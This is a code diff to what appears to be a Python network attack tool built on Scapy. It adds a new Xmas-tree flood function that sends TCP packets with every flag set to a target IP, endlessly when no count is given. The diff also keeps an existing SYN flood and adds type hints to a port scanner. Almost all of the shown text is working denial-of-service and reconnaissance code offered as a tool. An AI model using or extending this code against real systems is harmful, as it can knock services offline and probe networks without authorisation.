@@ -12,7 +12,7 @@ class Attack:
         pass
 
     @staticmethod
-    def port_scan(target_ip, src_ip, min_port, max_port):
+    def port_scan(target_ip: str, src_ip: str, min_port: int, max_port: int):
         print(PORT_SCAN_INIT_MSG)
 
         # Initialize Variables
@@ -42,7 +42,7 @@ class Attack:
         print(SYN_FLOOD_INIT_MSG + f"[IP: {target_ip}]")
 
         # Randomize port if not provided in command-line args
-        target_port = _syn_flood_port_randomizer(port)
+        target_port = _port_randomizer(port)
 
         # Make packet
         ip_header = IP(dst=target_ip)
@@ -52,6 +52,23 @@ class Attack:
         # Send SYN packets in flood
         _send_syn_flood(num_of_pkts, packet)
 
+        print(WELCOME_DECORATION)
+
+    @staticmethod
+    def xmas_tree(target_ip: str, port: int, num_of_pkts: int):
+        # Initialize
+        print(XMAS_TREE_INIT_MSG + f"[IP: {target_ip}]")
+
+        # Randomize port if not provided in command-line args
+        target_port = _port_randomizer(port)
+
+        # Make packet
+        ip_header = IP(dst=target_ip)
+        tcp_header = TCP(dport=target_port, flags=ALL_FLAGS)
+        packet = ip_header / tcp_header
+
+        # Send XMAS tree packets
+        _send_xmas_tree_flood(num_of_pkts, packet)
         print(WELCOME_DECORATION)
 
 
@@ -105,7 +122,17 @@ def _send_syn_flood(num_of_pkts, packet):
         print(SYN_FLOOD_COMPLETE_MSG)
 
 
-def _syn_flood_port_randomizer(port: int):
+def _send_xmas_tree_flood(num_of_pkts, packet):
+    if num_of_pkts is ZERO:
+        print(XMAS_TREE_STOP_MSG)
+        send(packet, loop=1)
+        print(XMAS_TREE_COMPLETE_FORCE_MSG)
+    else:
+        send(packet, loop=1, count=num_of_pkts)
+        print(XMAS_TREE_COMPLETE_MSG)
+
+
+def _port_randomizer(port: int):
     if port is ZERO:
         print(RANDOMIZE_PORT_MSG)
         port = random.randint(MIN_PORT, MAX_PORT)
